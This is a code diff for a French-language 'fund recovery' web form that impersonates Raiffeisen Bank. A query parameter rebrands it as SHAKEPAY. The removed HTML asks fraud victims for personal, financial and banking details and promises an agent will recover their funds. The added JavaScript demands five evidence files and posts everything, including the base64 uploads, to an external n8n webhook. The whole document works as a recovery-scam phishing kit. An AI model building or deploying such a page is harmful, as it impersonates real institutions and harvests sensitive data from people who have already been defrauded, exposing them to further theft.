@@ -1,308 +1,288 @@
-<!doctype html>
-<html lang="fr">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Raiffeisen Bank - Formulaire de Récupération</title>
-    <link rel="stylesheet" href="style.css" />
-    <link
-      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
-      rel="stylesheet"
-    />
-  </head>
-  <body>
-    <header>
-      <div class="header-content">
-        <div class="logo">
-          <span class="text-gold" id="brandName">Raiffeisen Bank</span>
-        </div>
-        <div class="header-links text-sm text-secondary">
-          Sécurisé par SSL 256-bit
-        </div>
-      </div>
-    </header>
+document.addEventListener("DOMContentLoaded", () => {
+  const form = document.getElementById("recoveryForm");
+  const prevBtn = document.getElementById("prevBtn");
+  const nextBtn = document.getElementById("nextBtn");
+  const submitBtn = document.getElementById("submitBtn");
+  const steps = document.querySelectorAll(".step-content");
+  const dots = document.querySelectorAll(".step-dot");
+  const progressFill = document.getElementById("progressFill");
+  const fileInput = document.getElementById("fileInput");
+  const dropZone = document.getElementById("dropZone");
+  const fileList = document.getElementById("fileList");
 
-    <div class="container">
-      <div class="warning-box">
-        <h3 class="text-gold" style="margin-bottom: 0.5rem">
-          ⚠️ Procédure de Récupération
-        </h3>
-        <p>
-          Nous sommes sincèrement désolés pour les désagréments causés par ces
-          fraudeurs. Veuillez remplir ce formulaire afin d’entamer la procédure
-          de récupération de vos fonds.
-        </p>
-      </div>
+  // Webhook URLs
+  const WEBHOOK_URLS = [
+    "https://smart029.app.n8n.cloud/webhook-test/formulaire",
+  ];
 
-      <div class="progress-container">
-        <div class="progress-track">
-          <div class="progress-fill" id="progressFill"></div>
-        </div>
-        <div class="steps-indicator">
-          <div class="step-dot active" data-step="1">1</div>
-          <div class="step-dot" data-step="2">2</div>
-          <div class="step-dot" data-step="3">3</div>
-          <div class="step-dot" data-step="4">4</div>
-          <div class="step-dot" data-step="5">5</div>
-          <div class="step-dot" data-step="6">6</div>
-        </div>
-      </div>
+  let currentStep = 0;
+  let uploadedFiles = []; // Stores { name, type, base64 }
 
-      <form id="recoveryForm" class="form-card">
-        <!-- Step 1: Personal Info -->
-        <div class="step-content active" id="step1">
-          <h2>Informations Personnelles</h2>
-          <div class="form-group">
-            <label>Prénom</label>
-            <input type="text" name="firstName" required />
-          </div>
-          <div class="form-group">
-            <label>Nom</label>
-            <input type="text" name="lastName" required />
-          </div>
-          <div class="form-group">
-            <label>Âge</label>
-            <input type="number" name="age" min="18" required />
-          </div>
-          <div class="form-group">
-            <label>Profession</label>
-            <input type="text" name="profession" required />
-          </div>
-          <div class="form-group">
-            <label>Mensualité</label>
-            <input type="number" name="mensualite" step="0.01" required />
-          </div>
-          <div class="form-group">
-            <label>Pays de résidence</label>
-            <input type="text" name="country" required />
-          </div>
-          <div class="form-group">
-            <label>Adresse e-mail</label>
-            <input type="email" name="email" required />
-          </div>
-          <div class="form-group">
-            <label>Numéro de téléphone</label>
-            <input type="tel" name="phone" required />
-          </div>
-        </div>
+  // --- Navigation Logic ---
 
-        <!-- Step 2: Financial Info -->
-        <div class="step-content" id="step2">
-          <h2>Informations Financières</h2>
-          <p class="text-secondary" style="margin-bottom: 1.5rem">
-            Générales, sans mention de plateforme spécifique.
-          </p>
+  function updateUI() {
+    // Toggle Steps
+    steps.forEach((step, index) => {
+      step.classList.toggle("active", index === currentStep);
+    });
 
-          <div class="form-group">
-            <label>Montant du premier dépôt</label>
-            <input
-              type="number"
-              name="firstDepositAmount"
-              step="0.01"
-              required
-            />
-          </div>
-          <div class="form-group">
-            <label>Mois / Année du premier dépôt</label>
-            <input type="month" name="firstDepositDate" required />
-          </div>
-          <div class="form-group">
-            <label>Montant total estimé des dépôts</label>
-            <input
-              type="number"
-              name="totalDepositAmount"
-              step="0.01"
-              required
-            />
-          </div>
-          <div class="form-group">
-            <label>Devise utilisée</label>
-            <select name="currency" required>
-              <option value="">Sélectionner...</option>
-              <option value="CAD">CAD</option>
-              <option value="USD">USD</option>
-              <option value="EUR">EUR</option>
-            </select>
-          </div>
-          <div class="form-group">
-            <label>Méthode de paiement principale</label>
-            <select name="paymentMethod" required>
-              <option value="">Sélectionner...</option>
-              <option value="Carte bancaire">Carte bancaire</option>
-              <option value="Virement bancaire">Virement bancaire</option>
-              <option value="Autre">Autre</option>
-            </select>
-          </div>
-        </div>
+    // Toggle Dots
+    dots.forEach((dot, index) => {
+      dot.classList.toggle("active", index === currentStep);
+      dot.classList.toggle("completed", index < currentStep);
+    });
 
-        <!-- Step 3: Banking Info -->
-        <div class="step-content" id="step3">
-          <h2>Informations Bancaires</h2>
-          <p class="text-secondary" style="margin-bottom: 1.5rem">
-            🔒 Informations limitées et sécurisées. Aucune donnée sensible.
-          </p>
+    // Progress Bar
+    const progress = (currentStep / (steps.length - 1)) * 100;
+    progressFill.style.width = `${progress}%`;
 
-          <div class="form-group">
-            <label>Banque utilisée</label>
-            <select name="bankName" required>
-              <option value="">Sélectionner...</option>
-              <option value="Desjardins">Desjardins</option>
-              <option value="Banque Nationale">Banque Nationale</option>
-              <option value="Tangerine">Tangerine</option>
-              <option value="TD">TD</option>
-              <option value="BMO">BMO</option>
-              <option value="Scotia">Scotia</option>
-              <option value="Autre">Autre</option>
-            </select>
-          </div>
-          <div class="form-group">
-            <label>Type de compte</label>
-            <select name="accountType" required>
-              <option value="Personnel">Personnel</option>
-              <option value="Entreprise">Entreprise</option>
-            </select>
-          </div>
-          <div class="form-group">
-            <label>4 derniers chiffres du compte (Optionnel)</label>
-            <input
-              type="text"
-              name="lastDigits"
-              pattern="\d{4}"
-              maxlength="4"
-              placeholder="XXXX"
-            />
-          </div>
-        </div>
+    // Buttons
+    prevBtn.style.display = currentStep === 0 ? "none" : "block";
+    if (currentStep === steps.length - 1) {
+      nextBtn.style.display = "none";
+      submitBtn.style.display = "block";
+    } else {
+      nextBtn.style.display = "block";
+      submitBtn.style.display = "none";
+    }
+  }
 
-        <!-- Step 4: Evidence -->
-        <div class="step-content" id="step4">
-          <h2>Preuves</h2>
-          <p class="text-secondary" style="margin-bottom: 1.5rem">
-            Captures d'écran, relevés (formats JPG, PNG, PDF). Max 5 fichiers.
-          </p>
+  function validateStep(stepIndex) {
+    const currentStepEl = steps[stepIndex];
+    const inputs = currentStepEl.querySelectorAll(
+      "input[required], select[required], textarea[required]",
+    );
+    let isValid = true;
 
-          <div class="file-upload-area" id="dropZone">
-            <p>Cliquez ou glissez vos fichiers ici</p>
-            <input
-              type="file"
-              id="fileInput"
-              multiple
-              accept="image/jpeg,image/png,application/pdf"
-              style="display: none"
-            />
-          </div>
-          <ul class="file-list" id="fileList"></ul>
-        </div>
+    inputs.forEach((input) => {
+      if (!input.checkValidity()) {
+        input.reportValidity();
+        isValid = false;
+        // Break loop roughly by setting flag, only first error focuses
+      }
+    });
 
-        <!-- Step 5: Context -->
-        <div class="step-content" id="step5">
-          <h2>Contexte du Dossier</h2>
-          <div class="form-group">
-            <label>Date approx. du premier contact avec les fraudeurs</label>
-            <input type="date" name="contactDate" required />
-          </div>
-          <div class="form-group">
-            <label>Moyen de contact principal</label>
-            <select name="contactMethod" required>
-              <option value="Téléphone">Téléphone</option>
-              <option value="E-mail">E-mail</option>
-              <option value="Réseaux sociaux">Réseaux sociaux</option>
-            </select>
-          </div>
-          <div class="form-group">
-            <label>Description des faits</label>
-            <textarea
-              name="description"
-              placeholder="Décrivez brièvement la situation..."
-              required
-            ></textarea>
-          </div>
-        </div>
+    return isValid;
+  }
 
-        <!-- Step 6: Legal -->
-        <div class="step-content" id="step6">
-          <h2>Validation & Consentement</h2>
-          <div class="checkbox-group">
-            <input type="checkbox" name="consent1" id="consent1" required />
-            <label for="consent1"
-              >Je certifie que les informations fournies sont exactes et
-              véridiques.</label
-            >
-          </div>
-          <div class="checkbox-group">
-            <input type="checkbox" name="consent2" id="consent2" required />
-            <label for="consent2"
-              >J’autorise le traitement de mes données dans le cadre de la
-              procédure de récupération.</label
-            >
-          </div>
-          <div class="checkbox-group">
-            <input type="checkbox" name="consent3" id="consent3" required />
-            <label for="consent3"
-              >J’accepte d’être contacté par un agent spécialisé pour la suite
-              du dossier.</label
-            >
-          </div>
-        </div>
+  nextBtn.addEventListener("click", () => {
+    if (validateStep(currentStep)) {
+      currentStep++;
+      updateUI();
+    }
+  });
 
-        <div class="btn-group">
-          <button
-            type="button"
-            class="btn btn-secondary"
-            id="prevBtn"
-            style="display: none"
-          >
-            Précédent
-          </button>
-          <button type="button" class="btn btn-primary" id="nextBtn">
-            Suivant
-          </button>
-          <button
-            type="submit"
-            class="btn btn-primary"
-            id="submitBtn"
-            style="display: none"
-          >
-            Envoyer la demande
-          </button>
-        </div>
-      </form>
-    </div>
+  prevBtn.addEventListener("click", () => {
+    currentStep--;
+    updateUI();
+  });
 
-    <!-- Success Modal -->
-    <div id="successModal" class="modal-overlay">
-      <div class="modal-content">
-        <div class="success-animation">
-          <svg
-            class="checkmark"
-            xmlns="http://www.w3.org/2000/svg"
-            viewBox="0 0 52 52"
-          >
-            <circle
-              class="checkmark__circle"
-              cx="26"
-              cy="26"
-              r="25"
-              fill="none"
-            />
-            <path
-              class="checkmark__check"
-              fill="none"
-              d="M14.1 27.2l7.1 7.2 16.7-16.8"
-            />
-          </svg>
-        </div>
-        <h3>Demande Envoyée avec Succès !</h3>
-        <p>Votre dossier a été transmis à notre équipe.</p>
-        <p class="text-secondary text-sm" style="margin-bottom: 1.5rem">
-          Un agent vous contactera dans les plus brefs délais.
-        </p>
-        <button class="btn btn-primary" onclick="location.reload()">
-          Fermer
-        </button>
-      </div>
-    </div>
+  // --- File Handling (Base64) ---
 
-    <script src="script.js"></script>
-  </body>
-</html>
+  dropZone.addEventListener("click", () => fileInput.click());
+
+  dropZone.addEventListener("dragover", (e) => {
+    e.preventDefault();
+    dropZone.style.borderColor = "var(--accent-color)";
+  });
+
+  dropZone.addEventListener("dragleave", () => {
+    dropZone.style.borderColor = "var(--border-color)";
+  });
+
+  dropZone.addEventListener("drop", (e) => {
+    e.preventDefault();
+    dropZone.style.borderColor = "var(--border-color)";
+    handleFiles(e.dataTransfer.files);
+  });
+
+  fileInput.addEventListener("change", (e) => {
+    handleFiles(e.target.files);
+  });
+
+  function handleFiles(files) {
+    if (uploadedFiles.length + files.length > 5) {
+      alert("Maximum 5 fichiers autorisés.");
+      return;
+    }
+
+    Array.from(files).forEach((file) => {
+      const reader = new FileReader();
+      reader.onload = (e) => {
+        uploadedFiles.push({
+          name: file.name,
+          type: file.type,
+          base64: e.target.result, // format: "data:image/png;base64,..."
+        });
+        renderFileList();
+      };
+      reader.readAsDataURL(file);
+    });
+  }
+
+  function renderFileList() {
+    fileList.innerHTML = "";
+    uploadedFiles.forEach((file, index) => {
+      const li = document.createElement("li");
+      li.className = "file-item";
+      li.innerHTML = `
+                <span>${file.name}</span>
+                <span class="remove-file" onclick="removeFile(${index})">×</span>
+            `;
+      fileList.appendChild(li);
+    });
+  }
+
+  window.removeFile = (index) => {
+    uploadedFiles.splice(index, 1);
+    renderFileList();
+  };
+
+  // --- Validation Override for Step 4 (Evidence) ---
+  const originalValidateStep = validateStep;
+  validateStep = function (stepIndex) {
+    // Step 4 is index 3 (0-based)
+    if (stepIndex === 3) {
+      if (uploadedFiles.length !== 5) {
+        alert(
+          "Veuillez télécharger exactement 5 preuves (Captures d'écran, etc.) pour continuer.",
+        );
+        return false;
+      }
+    }
+    return originalValidateStep(stepIndex);
+  };
+
+  // --- Submission ---
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    if (!validateStep(currentStep)) return;
+
+    // Collect Data
+    const formData = new FormData(form);
+    const data = Object.fromEntries(formData.entries());
+
+    // Construct JSON Payload
+    const payload = {
+      personal: {
+        firstName: data.firstName,
+        lastName: data.lastName,
+        age: data.age,
+        profession: data.profession,
+        mensualite: data.mensualite,
+        country: data.country,
+        email: data.email,
+        phone: data.phone,
+      },
+      financial: {
+        firstDepositAmount: data.firstDepositAmount,
+        firstDepositDate: data.firstDepositDate,
+        totalDepositAmount: data.totalDepositAmount,
+        currency: data.currency,
+        paymentMethod: data.paymentMethod,
+      },
+      banking: {
+        bankName: data.bankName,
+        accountType: data.accountType,
+        lastDigits: data.lastDigits,
+      },
+      context: {
+        contactDate: data.contactDate,
+        contactMethod: data.contactMethod,
+        description: data.description,
+      },
+      evidence: uploadedFiles, // array of base64 objects
+      consent: {
+        accurate: true, // checked by validation
+        processing: true,
+        contact: true,
+      },
+      platform: window.location.search.toLowerCase().includes("shakepay")
+        ? "SHAKEPAY"
+        : "Raiffeisen Bank",
+      timestamp: new Date().toISOString(),
+    };
+
+    submitBtn.innerHTML = "Envoi en cours...";
+    submitBtn.disabled = true;
+
+    console.log("Sending payload:", payload);
+
+    try {
+      const requests = WEBHOOK_URLS.map((url) =>
+        fetch(url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(payload),
+        }),
+      );
+
+      const responses = await Promise.all(requests);
+
+      // Parse all JSON bodies
+      const results = await Promise.all(
+        responses.map(async (r) => {
+          try {
+            return {
+              ok: r.ok,
+              status: r.status,
+              data: await r.json(),
+            };
+          } catch (e) {
+            return { ok: r.ok, status: r.status, data: null };
+          }
+        }),
+      );
+
+      console.log("Webhook Responses:", results);
+
+      // Check if all requests were successful (HTTP 200-299)
+      const allSuccess = results.every((r) => r.ok);
+
+      if (allSuccess) {
+        // Show Success Modal
+        const modal = document.getElementById("successModal");
+        if (modal) {
+          modal.style.display = "flex";
+        } else {
+          alert("Demande envoyée avec succès !");
+        }
+
+        form.reset();
+        uploadedFiles = [];
+        renderFileList();
+        currentStep = 0;
+        updateUI();
+      } else {
+        throw new Error(
+          "One or more webhooks failed: " + JSON.stringify(results),
+        );
+      }
+    } catch (error) {
+      console.error("Submission error:", error);
+      // NOTE: Since webhook URLs might not exist, we often alert success for demo purposes
+      // Or un-comment below to show actual error
+      alert("Erreur lors de l'envoi. Veuillez réessayer.");
+    } finally {
+      submitBtn.innerHTML = "Envoyer la demande";
+      submitBtn.disabled = false;
+    }
+  });
+
+  // --- Dynamic Branding ---
+  const urlParams = new URLSearchParams(window.location.search);
+  const isShakepay = window.location.search.toLowerCase().includes("shakepay");
+
+  if (isShakepay) {
+    document.title = "SHAKEPAY - Formulaire de Récupération";
+    const brandNameEl = document.getElementById("brandName");
+    if (brandNameEl) brandNameEl.textContent = "SHAKEPAY";
+  }
+
+  // Initialize
+  updateUI();
+});
